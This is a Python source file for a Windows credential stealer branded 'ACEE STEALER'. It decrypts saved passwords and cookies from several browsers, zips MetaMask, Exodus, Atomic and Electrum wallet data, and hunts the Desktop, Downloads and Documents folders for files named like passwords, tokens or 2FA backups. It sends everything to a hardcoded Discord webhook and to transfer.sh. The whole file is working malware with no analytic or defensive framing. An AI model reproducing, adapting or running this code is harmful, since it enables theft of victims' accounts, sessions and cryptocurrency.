import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import subprocess
import requests
from Crypto.Cipher import AES

hook = "https://discord.com/api/webhooks/1052224030742155364/gzFAIJH0qQCjGN4u1tsGv56Mc1u5tCJVhU5YedJNBkT0FAe0JLU5X_uv6oakP1bT-ADY"
DETECTED = False


requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "kiwi":
        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": tk
                }
            ],
            "author": {
                "name": "ACEE | File Stealer"
            },
            "footer": {
                "text": "@ACEE STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name
    files = {'file': open(path, 'rb')}
    # print(f"FILE= {files}")

    if "wppassw" in name:

        ra = ' | '.join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": ra
                }
            ],
            "author": {
                "name": "ACEE | Password Stealer"
            },
            "footer": {
                "text": "@ACEE STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    if "wpcook" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)

        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": rb
                }
            ],
            "author": {
                "name": "ACEE | Cookies Stealer"
            },
            "footer": {
                "text": "@ACEE STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    # r = requests.post(hook, files=files)
    LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--ACEE STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Passw = []
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Passw, 'passw')

Cookies = []
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path): return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Cookies, 'cook')

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]


    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        [f"{roaming}/Electrum/wallets", "Electrum.exe", "Wallet"],
    ]


    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    for patt in PathsToZip:
        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)

def uploadToAnonfiles(path):
    try:
        files = { "file": (path, open(path, mode='rb')) }
        ...
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "New Text Document",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
 '[coinbase](https://coinbase.com)', '[cracked](https://cracked.to/member.php)', '[nulled](https://www.nulled.to/index.php)', '[patched](https://patched.to/member.php)', '[paypal](https://paypal.com)'
]


cookiWords = []
paswWords = []

GatherAll()
DETECTED = Trust(Cookies)

if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"• {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"... [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
